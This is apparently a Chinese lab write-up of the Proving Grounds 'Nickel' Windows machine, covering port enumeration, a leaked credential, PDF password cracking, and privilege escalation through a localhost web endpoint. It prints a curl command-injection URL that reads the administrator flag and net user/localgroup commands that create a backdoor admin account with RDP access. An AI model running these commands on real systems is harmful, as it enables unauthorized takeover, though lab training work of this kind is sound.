---
title: Proving Grounds Practice-Nickel-Windows
date: 2025-6-25 20:00:00
tags: 红队
categories: 红队打靶-Windows
---

# 信息收集

## nmap

![image-20250625150859986](./Nickel-Windows/image-20250625150859986.png)

## 8089端口&&33333端口

8089端口是一个DevOps的面板，点击其中的按钮无法访问

![image-20250625160829859](./Nickel-Windows/image-20250625160829859.png)

查看源码，是跳到一个ip地址的33333端口，这个ip是写死的，应该是要跳转到当前靶机的33333端口，并且是get访问方式

![image-20250625160835809](./Nickel-Windows/image-20250625160835809.png)

直接访问33333端口显示无效的token

![image-20250625161054338](./Nickel-Windows/image-20250625161054338.png)

尝试访问33333端口的这三个目录，以get方式提交时回显不能以get提交，修改请求方法，以post请求

![image-20250625161159119](./Nickel-Windows/image-20250625161159119.png)

以post请求时，`/list-running-procs`有回显，回显了当前进程，其他两个回显了`Not Implemented`

![image-20250625161729587](./Nickel-Windows/image-20250625161729587.png)

其中一个进程中包含了一个账号密码，密码是base64加密，解密之后得到

```
ariah:NowiseSloopTheory139
```

## ftp

该用户可以成功登录到ftp，ftp下有一个pdf文件，下载到本地分析

![image-20250625163820099](./Nickel-Windows/image-20250625163820099.png)

该文件是加密的

![image-20250625170335091](./Nickel-Windows/image-20250625170335091.png)

使用john破解

![image-20250625170350219](./Nickel-Windows/image-20250625170350219.png)

![image-20250625170425029](./Nickel-Windows/image-20250625170425029.png)

得到正确密码`ariah4168`

![image-20250625170458734](./Nickel-Windows/image-20250625170458734.png)

nickel是该靶机的名称，前面通过nmap扫到的80端口无法直接访问，这里应该指的就是靶机的80端口





smb也可以通过该用户连接，但是共享的信息该用户没有权限访问

rpc该用户也可以连接，也没有有用的信息

# ssh-getshell/提权

该用户可以直接ssh连接，通过ssh连接之后就可以拿到local.txt

前面说到该靶机的80端口开放服务但是无法访问，我们尝试在靶机内部访问

![image-20250625171325992](./Nickel-Windows/image-20250625171325992.png)

![image-20250625171333453](./Nickel-Windows/image-20250625171333453.png)

该节点中是有内容的，上面pdf中给出的第一个应该就是要问号后面加get提交的参数，可以成功命令执行，并且我还尝试了backup目录，但是访问失败

![image-20250625171539784](./Nickel-Windows/image-20250625171539784.png)

该节点是以管理员的权限运行命令

可以直接打印proof.txt

```
curl http://localhost/?type%20C%3a%5cUsers%5cAdministrator%5cDesktop%5cpro
of.txt
```

也可以创建一个新用户赋予管理员权限和远程桌面组

```
#To create a user named api with a password of Dork123!
net user api Dork123! /add

#To add to the administrator and RDP groups
net localgroup Administrators api /add
#并且加入远程桌面组
net localgroup 'Remote Desktop Users' api /add

#url编码
net%20user%20api%20Dork123!%20%2Fadd

net%20localgroup%20Administrators%20api%20%2Fadd

net%20localgroup%20%27Remote%20Desktop%20Users%27%20api%20%2Fadd
```

![image-20250625174636166](./Nickel-Windows/image-20250625174636166.png)

然后通过xfreerdp连接远程桌面

```
xfreerdp /u:api /p:Dork123! /v:192.168.133.99
```

![image-20250625174743252](./Nickel-Windows/image-20250625174743252.png)